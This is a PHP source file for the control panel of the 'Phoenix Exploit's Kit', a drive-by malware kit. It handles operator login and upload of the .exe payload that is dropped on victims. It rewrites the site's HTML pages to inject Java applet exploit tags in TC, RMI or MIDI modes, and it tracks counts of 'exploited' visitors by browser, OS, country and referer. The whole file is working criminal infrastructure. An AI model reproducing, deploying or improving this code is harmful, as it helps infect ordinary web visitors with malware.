<?php
$currentmode="CURRENTJAVAMODE";
/*MODESEPPARATOR*/
$miditags="<applet mayscript='true' code='a.class' archive='FULL_PATH_TO_JAR'><param name='trigger' value='VALUE_OF_TRIGGER'><param name='url' valuetype='ref' value='FULL_PATH_TO_MIDI_SHELLCODE'></applet>";
$rmitags="<applet mayscript='true' code='a.class' archive='NAME_OF_RMI_ARCHIVE'><param name='trigger' value='VALUE_OF_TRIGGER'><param name='a' value='ENCRYPTED_RMI_LINK'></applet>";
$tctags="<applet mayscript='true' code='bpac.a.class' archive='NAME_OF_TC_ARCHIVE'><param name='trigger' value='VALUE_OF_TRIGGER'><param name='a' value='ENCRYPTED_TC_LINK'></applet>";
/*SEPPARATOR*/
require_once( "yzbwkuivbvbtxra.php" );
require_once( "evhrcnf.php" );
require_once( "itivhqcuele.php" );
session_start( );

//Функция записи файлов
function WriteFile($path,$data)
	{
		$file = $path;
		$fh = fopen($file, "w") or die("File ($file) does not exist!");
		fwrite($fh, $data);
		fclose($fh);
	}

		if (!function_exists("scandir"))
			{
				function scandir($dir)
					{
						$dh = opendir($dir);
						while (false !== ($filename = readdir($dh)))
							{
								if (($filename != '.') && ($filename != '..'))
              								{
              									$files[] = $filename;
              								}
             						} 
       						closedir($dh);
       						sort($files);
						return $files;
       					}
			}


//СДЕЛАТЬ ПЕРЕМЕННЫЕ С ТЕГАМИ ГЛОБАЛЬНЫМИ!!!

//Функция изменения режима явы
function ChangeMode($mode)
	{
global $miditags, $rmitags, $tctags;
		if ($mode=="rmi")
			{
				$javatags=$rmitags;
			}
		if ($mode=="midi")
			{
				$javatags=$miditags;
			}
		if ($mode=="tc")
			{
				$javatags=$tctags;
			}
		$sepparator="<body id='";
		$files=scandir(".");
		for ($i=1; $i <= sizeof($files); $i++ )
			{
				$filename=$files[$i];
				$temp=explode(".",$filename);
				if (($temp[1]=="html"))
					{	//Изменяем значение тригера
						if ( strstr( file_get_contents($filename), "isie" ) )
							{
								$javatagst=str_replace("VALUE_OF_TRIGGER", "isie", $javatags);
								$sepparated=explode($sepparator,file_get_contents($filename));
								$output=$javatagst.$sepparator.$sepparated[1];
								WriteFile($filename,$output);
							}
						else if ( strstr( file_get_contents($filename), "notie" ) )
							{
								$javatagst=str_replace("VALUE_OF_TRIGGER", "notie", $javatags);
								$sepparated=explode($sepparator,file_get_contents($filename));
								$output=$javatagst.$sepparator.$sepparated[1];
								WriteFile($filename,$output);
							}
						else
							{
								//$javatagst="";
							}

					}
			}
	}


$aln=$_GET['adminln'];
$aln1=$_GET['ADMINLN'];
$aln2=$_POST['adminln'];
$aln3=$_POST['ADMINLN'];


//SELLERS STATS
if (isset( $_GET['n'] ))
	{
//НЕДОСТУПНО В ЭТОЙ ВЕРСИИ АДМИНКИ. В СЛУЧАЕ ВЫЯВЛЕНИЯ ИСПОЛЬЗОВАНИЯ ДРУГОЙ АДМИНКИ БЕЗ ЕЕ ПРИОБРЕТЕНИЯ-ЛИШЕНИЕ ЛИЦЕНЗИИ.
	}








//MAIN STATS





else

{


@$act = @strtolower( @$_GET['go'] );

if (( !isset( $_SESSION['pw'] ) || $_SESSION['pw'] != $ADMINPW ) and ( !isset( $_SESSION['login'] ) || $_SESSION['login'] != $ADMINLN ))
	{
    		unset( $_SESSION['pw'] );
    		unset( $_SESSION['login'] );
    		if (( !isset( $_POST['pw'] ) ) and ( !isset( $_POST['login'] ) ))
			{
        			echo "<html><head><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style><title>Phoenix Exploit's Kit - Log In</title></head><body bgcolor=black><table width=100% height=100% border=0><tr align=top width=100% height=37><td align=center><img src=gofvfqasazivb7.jpg align=bottom></td></tr><tr><td align=center><table border=0 width='100%' height='100%' align=bottom>";
        			echo "<tr height='100%'><td width='100%' align='center' valign='bottom'><form method='POST' id='loginform'><table class='wnd' cellpadding=3 cellspacing=1><tr class='hdr'><td colspan=2 align='center'>Please enter your password</td></tr><tr><td align='right'>Password:</td><td align='left'><input type='password' name='pw' /></td></tr></tr><td align='left'><a href='#' onclick='window.close();'><font color=#FFFFFF>CANCEL</font></a></td><td align='right'><a href='#' onclick='javascript:document.getElementById(\"loginform\").submit();'><font color=#FFFFFF>OK</font></a></td></tr></table></form></td></tr></table></td></tr>";
        			echo "<tr align=bottom height=406><td><img src=isasflgzkvkoapa.gif align=right></td></tr></table></body></html>";
    			}
		else
			{
        			$pw = sha1( $_POST['pw'] );
        			$login=sha1($_POST['login']);
        			$_SESSION['pw'] = $pw;
        			$_SESSION['login'] = $login;
        			redir( "?" );
    			}
    		exit();
}

switch ( $act )
	{









    		case "upload" :
        	if (isset( $_POST['upl'] ))
			{
            			$exe = file_get_contents( $_FILES['filename']['tmp_name'] );
            			WriteFile('itiqjmdocvfqdv6.exe',$exe);
            			redir( "?" );
        		}
		else
			{
            			echo "<html><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style><title>Phoenix Exploit's Kit - Do you really wanna clear the statistics?</title>";
            			echo "<body bgcolor='black'><table width='100%' height='100%' border='0'><td><tr align='top' width='100%' height='37'><td align='left'><img src='bmelgrdoyu.jpg' align='bottom'></td></tr><tr align='top'><td align='center' valign='top'><table border=0 align='right' valign='top'><tr align='top'><td align='left' valign='bottom'><center>Do you really wanna <b>upload new .exe file</b>?<p/><form method='POST' enctype='multipart/form-data' action='jmdmgsevxuelywktjq.php?go=upload' id='uplform'><input type='file' name='filename'><br><br><input type='hidden' name='upl' value='Yes'><a href='#' class='red' onclick='javascript:document.getElementById(\"uplform\").submit();'>Yes</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a class='red' href='jmdmgsevxuelywktjq.php'>No</a></form></center></td><td align='right' valign='top' width='300'></td><td align='right' valign='top'><table class='wnd2' cellpadding=3 cellspacing=0><tr class='hdr'><td align='center' colspan=4>Menu</td>";
            			echo "</tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php'>Simple statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=advanced_statistics'>Advanced statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=countries_statistics'>Countries statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=referers_statistics'>Referers statistics<a/></td></tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=clear'>Clear statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=changemode'>Change Mode<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=upload'>Upload .exe<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=logout'>Exit<a/></td></tr></table><table><tr><td></td></tr></table>";
        		}
        	break;










    		case "logout" :
        		unset( $_SESSION['pw'] );
        		unset( $_SESSION['login'] );
        		redir( "?" );
        		break;




    		case "clear" :
        	if ( !isset( $_POST['clear'] ) )
			{
            			echo "<html><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style><title>Phoenix Exploit's Kit - Do you really wanna clear the statistics?</title>";
            			echo "<body bgcolor='black'><table width='100%' height='100%' border='0'><td><tr align='top' width='100%' height='37'><td align='left'><img src='bmelgrdoyu.jpg' align='bottom'></td></tr><tr align='top'><td align='center' valign='top'><table border=0 align='right' valign='top'><tr align='top'><td align='left' valign='bottom'><center>Do you really wanna <b>clear the statistics</b>?<p/><form method='POST' id='clearform'><input type='hidden' name='clear' value='Yes'><a href='#' class='red' onclick='javascript:document.getElementById(\"clearform\").submit();'>Yes</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a class='red' href='jmdmgsevxuelywktjq.php'>No</a></form></center></td><td align='right' valign='top' width='300'></td><td align='right' valign='top'><table class='wnd2' cellpadding=3 cellspacing=0><tr class='hdr'><td align='center' colspan=4>Menu</td>";
            			echo "</tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php'>Simple statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=advanced_statistics'>Advanced statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=countries_statistics'>Countries statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=referers_statistics'>Referers statistics<a/></td></tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=clear'>Clear statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=changemode'>Change Mode<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=upload'>Upload .exe<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=logout'>Exit<a/></td></tr></table><table><tr><td></td></tr></table>";
        		}
		else
			{
            			mysql_query( "TRUNCATE TABLE stats" );
            			redir( "?" );
        		}
        	break;

		case "changemode" :
        	if ( !isset( $_POST['mode'] ) )
			{
				echo "<html><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style><title>Phoenix Exploit's Kit - Do you really wanna change exploit's kit mode?</title>";
				echo "<body bgcolor='black'><table width='100%' height='100%' border='0'><td><tr align='top' width='100%' height='37'><td align='left'><img src='bmelgrdoyu.jpg' align='bottom'></td></tr><tr align='top'><td align='center' valign='top'><table border=0 align='right' valign='top'><tr align='top'><td align='left' valign='bottom'><center>Do you really wanna <b>change exploit's kit mode</b>?<p/><form method='POST' id='changemodeform'><input type='radio' name='mode' value='tc'>TC<br><input type='radio' name='mode' value='rmi'>RMI<br><input type='radio' name='mode' value='midi'>MIDI<br><a href='#' class='red' onclick='javascript:document.getElementById(\"changemodeform\").submit();'>Yes</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a class='red' href='jmdmgsevxuelywktjq.php'>No</a></form></center></td><td align='right' valign='top' width='300'></td><td align='right' valign='top'><table class='wnd2' cellpadding=3 cellspacing=0><tr class='hdr'><td align='center' colspan=4>Menu</td>";
				echo "</tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php'>Simple statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=advanced_statistics'>Advanced statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=countries_statistics'>Countries statistics<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=referers_statistics'>Referers statistics<a/></td></tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=clear'>Clear statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=changemode'>Change Mode<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=upload'>Upload .exe<a/></td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php?go=logout'>Exit<a/></td></tr></table><table><tr><td></td></tr></table>";
        		}
		else
			{
				if ($currentmode=="CURRENTJAVAMODE")
					{
						echo "Unable to change exploit's kit mode - exploit's kit is not activated yet!";
					}
				else
					{
						$mode=$_POST['mode'];
						ChangeMode($mode);
						$stats=file_get_contents("jmdmgsevxuelywktjq.php");
						$sepparatedstats=explode("/*MODESEP"."PARATOR*/",$stats);
						$statstotal="<?php\r\n\$currentmode=\"".$mode."\";\r\n/*MODESEP"."PARATOR*/".$sepparatedstats[1];
						WriteFile("jmdmgsevxuelywktjq.php",$statstotal);
            					redir( "?" );
					}
        		}
        	break;











    		case "" :
        		echo "<html><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style><title>Phoenix Exploit's Kit - Simple Statistics</title><body bgcolor='black'><table width='100%' height='100%' border='0'><td><tr align='top' width='100%' height='37'><td align='left'><img src='bmelgrdoyu.jpg' align='bottom'></td></tr><tr align='top'><td align='center' valign='top'><table border=0 align='left' valign='top'><tr align='top'><td align='center' valign='top'>";
        		echo "<table class='wnd' cellpadding=3 cellspacing=2><tr class='hdr'><td align='center' colspan=4>Simple browser statistics</td></tr><tr><td><b>Browser</b></td><td><b>Visits</b></td><td><b>Exploited</b></td><td><b>Percent</b></td></tr>";
        		$starr = getstats( "browtype" );
        		$i = 0;
        		for ( ; $i < count( $starr[0] ); $i++ )
				{
            				echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0][$i]}</td><td>{$starr[1][$i]}</td><td>{$starr[2][$i]}</td><td>{$starr[3][$i]}</td></tr>";
        			}

        		$r = mysql_query( "SELECT COUNT(*) FROM stats" );
        		$row = mysql_fetch_row( $r );
        		$total = intval($row[0]);
        		$r = mysql_query( "SELECT COUNT(*) FROM stats WHERE hit!=0" );
        		$row = mysql_fetch_row( $r );
        		$exped = intval($row[0]);
        		$prc = doprc( $exped, $total );

        		echo "</table></td><td align='center' valign='top'><table class='wnd' cellpadding=3 cellspacing=2><tr class='hdr'><td align='center' colspan=3>Main Statistics</td></tr><tr><td><b>Unique Visits</b></td><td><b>Exploited</b></td><td><b>Percent</b></td></tr>";

        		if ($total!=0)
				{
            				echo "<tr class='dark'><td>{$total}</td><td>{$exped}</td><td>{$prc}</td></tr>";
        			}

        		echo "</table></td><td align='center' valign='top'><table class='wnd' cellpadding=3 cellspacing=2><tr class='hdr'><td align='center' colspan=3>Exploit statistics</td></tr><tr><td><b>Exploit</b></td><td><b>Exploited</b></td><td><b>Percent</b></td></tr>";
        		$starr = getexpstats( );
        		$i = 0;
        		for ( ; $i < count( $starr[0] ); $i++ )
				{
            				$percent=doprc( $starr[1][$i], $total );
            				echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0][$i]}</td><td>{$starr[1][$i]}</td><td>{$percent}</td></tr>";
        			}
        		echo "</table></td><td align='center' valign='top' width='50'></td><td align='center' valign='top'><table class='wnd2' cellpadding=3 cellspacing=0><tr class='hdr'><td align='center' colspan=4>Menu</td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php'>Simple statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=advanced_statistics'>Advanced statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=countries_statistics'>Countries statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=referers_statistics'>Referers statistics<a/></td></tr><td align='center' colspan=4><a href='?go=clear'>Clear statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=changemode'>Change Mode<a/></td></tr><tr><td align='center' colspan=4><a href='?go=upload'>Upload .exe<a/></td></tr><tr><td align='center' colspan=4><a href='?go=logout'>Exit<a/></td></tr></table><table><tr><td></td></tr></table>";

        		break;
















    		case "advanced_statistics" :
        		echo "<html><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style><title>Phoenix Exploit's Kit - Advanced Statistics</title><body bgcolor='black'><table width='100%' height='100%' border='0'><td><tr align='top' width='100%' height='37'><td align='left'><img src='bmelgrdoyu.jpg' align='bottom'></td></tr><tr align='top'><td align='center' valign='top'>";
        		echo "<table border=0 align='left' valign='top'><tr align='top'><td align='center' valign='top'><table class='wnd' cellpadding=3 cellspacing=2><tr class='hdr'><td align='center' colspan=4>Operation systems statistics</td></tr><tr><td><b>OS</b></td><td><b>Visits</b></td><td><b>Exploited</b></td><td><b>Percent</b></td></tr>";
        		$starr = getstats( "osver" );
        		$i = 0;
        		for ( ; $i < count( $starr[0] ); $i++ )
				{
            				echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0][$i]}</td><td>{$starr[1][$i]}</td><td>{$starr[2][$i]}</td><td>{$starr[3][$i]}</td></tr>";
        			}
        		echo "</table></td><td align='center' valign='top'><table class='wnd' cellpadding=3 cellspacing=2><tr class='hdr'><td align='center' colspan=4>Advanced browsers statistics</td></tr><tr><td><b>Browser</b></td><td><b>Visits</b></td><td><b>Exploited</b></td><td><b>Percent</b></td></tr>";
        		$starr = getstats( "browver" );
        		$i = 0;
        		for ( ; $i < count( $starr[0] ); $i++ )
				{
            				echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0][$i]}</td><td>{$starr[1][$i]}</td><td>{$starr[2][$i]}</td><td>{$starr[3][$i]}</td></tr>";
        			}
        		echo "</table></td><td align='center' valign='top' width='50'></td><td align='center' valign='top'><table class='wnd2' cellpadding=3 cellspacing=0><tr class='hdr'><td align='center' colspan=4>Menu</td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php'>Simple statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=advanced_statistics'>Advanced statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=countries_statistics'>Countries statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=referers_statistics'>Referers statistics<a/></td></tr><td align='center' colspan=4><a href='?go=clear'>Clear statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=changemode'>Change Mode<a/></td></tr><tr><td align='center' colspan=4><a href='?go=upload'>Upload .exe<a/></td></tr><tr><td align='center' colspan=4><a href='?go=logout'>Exit<a/></td></tr></table><table><tr><td></td></tr></table>";

        		break;














    		case "countries_statistics" :
        		echo "<html><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style><title>Phoenix Exploit's Kit - Countries Statistics</title><body bgcolor='black'><table width='100%' height='100%' border='0'><td>";
        		echo "<tr align='top' width='100%' height='37'><td align='left'><img src='bmelgrdoyu.jpg' align='bottom'></td></tr><tr align='top'><td align='center' valign='top'><table border=0 align='left' valign='top'><tr align='top'><td align='center' valign='top'><table class='wnd' cellpadding=3 cellspacing=2><tr class='hdr'><td align='center' colspan=4>Countries statistics</td></tr><tr><td><b>Country</b></td><td><b>Visitors</b></td><td><b>Exploited</b></td><td><b>Percent</b></td></tr>";
        		$starr = getstats( "country" );
        		$i = 0;
        		for ( ; $i < count( $starr[0] ); $i++ )
				{
            				echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0][$i]}</td><td>{$starr[1][$i]}</td><td>{$starr[2][$i]}</td><td>{$starr[3][$i]}</td></tr>";
        			}
        		echo "</table></td><td align='center' valign='top' width='50'></td><td align='center' valign='top'><table class='wnd2' cellpadding=3 cellspacing=0><tr class='hdr'><td align='center' colspan=4>Menu</td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php'>Simple statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=advanced_statistics'>Advanced statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=countries_statistics'>Countries statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=referers_statistics'>Referers statistics<a/></td></tr><td align='center' colspan=4><a href='?go=clear'>Clear statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=changemode'>Change Mode<a/></td></tr><tr><td align='center' colspan=4><a href='?go=upload'>Upload .exe<a/></td></tr><tr><td align='center' colspan=4><a href='?go=logout'>Exit<a/></td></tr></table><table><tr><td></td></tr></table>";

        	break;















//ORIGINAL REFERERS
		case "referers_statistics" :

			echo "<html><style type='text/css'>body, td {font-family: Tahoma; font-size: 13px; color: #DEDEDE}body {background-color: #000000; background-image: url(img/loginlogo.gif); background-attachment: fixed; background-position: right bottom; background-repeat: no-repeat}table.wnd {border: 1px solid #820000; background: #000000}table.wnd tr.hdr {background: #820000; font-weight: bolder}table.wnd2 {border: 1px solid #101010; background: #000000}table.wnd2 tr.hdr {background: #101010; font-weight: bolder}a {color: #9EB9CB}a:hover {color: #E9BBA7}tr.dark {background: #1D1D1D}a.red {color: #820000}</style>";

			echo "<title>Phoenix Exploit's Kit - Referers statistics</title><body bgcolor='black'><table width='100%' height='100%' border='0'><td><tr align='top' width='100%' height='37'><td align='left'><img src='bmelgrdoyu.jpg' align='bottom'></td></tr><tr align='top'><td align='center' valign='top'><table border=0 align='left' valign='top'><tr align='top'><td align='center' valign='top'><table class='wnd' cellpadding=3 cellspacing=2><tr class='hdr'><td align='center' colspan=4>Referers statistics</td></tr><tr><td><b>Referer</b></td><td><b>Visitors</b></td><td><b>Exploited</b></td><td><b>Percent</b></td></tr>";

			$starr = getstats( "referer" );

			$i = 0;

			for ( ; $i < count( $starr[0] ); $i++ )
				{

					echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0][$i]}</td><td>{$starr[1][$i]}</td><td>{$starr[2][$i]}</td><td>{$starr[3][$i]}</td></tr>";

				}

			echo "</table></td><td align='center' valign='top' width='50'></td><td align='center' valign='top'><table class='wnd2' cellpadding=3 cellspacing=0><tr class='hdr'><td align='center' colspan=4>Menu</td></tr><tr><td align='center' colspan=4><a href='jmdmgsevxuelywktjq.php'>Simple statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=advanced_statistics'>Advanced statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=countries_statistics'>Countries statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=referers_statistics'>Referers statistics<a/></td></tr><td align='center' colspan=4><a href='?go=clear'>Clear statistics<a/></td></tr><tr><td align='center' colspan=4><a href='?go=changemode'>Change Mode<a/></td></tr><tr><td align='center' colspan=4><a href='?go=upload'>Upload .exe<a/></td></tr><tr><td align='center' colspan=4><a href='?go=logout'>Exit<a/></td></tr></table><table><tr><td></td></tr></table>";

		break;




}


//BOTTOM
    echo "</td></tr></table></tr></td><td valign='bottom'><img src='isasflgzkvkoapa.gif' align='right'></td></tr></table></body></html>";

exit( );


}
?>